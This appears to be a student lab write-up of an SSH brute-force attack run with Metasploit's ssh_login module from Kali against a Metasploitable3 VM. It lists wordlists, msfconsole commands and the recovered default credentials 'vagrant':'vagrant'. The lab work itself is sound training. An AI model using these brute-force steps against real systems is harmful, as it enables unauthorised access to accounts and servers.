
# Task 1.1 – SSH Brute-force Using Metasploit

## Environment Setup
- **Victim VM**: Metasploitable3
- **Attacker VM**: Kali Linux
- **Target Service**: SSH
- **Target IP**: 192.168.56.6

## Steps Performed

### 1. Verified SSH is running
```bash
service ssh status
```
<img src="./screenshots/01_ssh_service_status.png" alt="User/Pass file created" width="600">

### 2. Created users and passwords files
```bash
nano users.txt
nano pass.txt
```
Files Content:
- users.txt: Shahad, Norah, vagrant, Jude, Jouri, Abood, Hamood, Noor, Rawan, Ali, Ooody
- pass.txt: Shahad, Norah, vagrant, Jude, Jouri, Abood, Hamood, Noor, Rawan, Ali, Ooody


<img src="./screenshots/02_user_pass_created.png" alt="User/Pass file created" width="600">




### 3. Launched Metasploit Framework
```bash
msfconsole
```
<img src="./screenshots/03_msfconsole.png" alt="User/Pass file created" width="600">

### 4. Searched for SSH modules
```bash
search ssh
```
<img src="./screenshots/04_search_ssh.png" alt="User/Pass file created" width="600">

### 5. Selected ssh_login module
```bash
use 0 
show options
```
<img src="./screenshots/05_ssh_login_config.png" alt="User/Pass file created" width="600">

### 6. Configured and ran brute-force attack
```bash
set USER_FILE users.txt
set PASS_FILE pass.txt
set RHOSTS 192.168.56.6
run
```
<img src="./screenshots/06_bruteforce_attempt.png" alt="User/Pass file created" width="600">

### Result:
Valid credentials found:
```
Success: 'vagrant':'vagrant'
Session 1 opened
```
<img src="./screenshots/07_successful_login.png" alt="User/Pass file created" width="600">
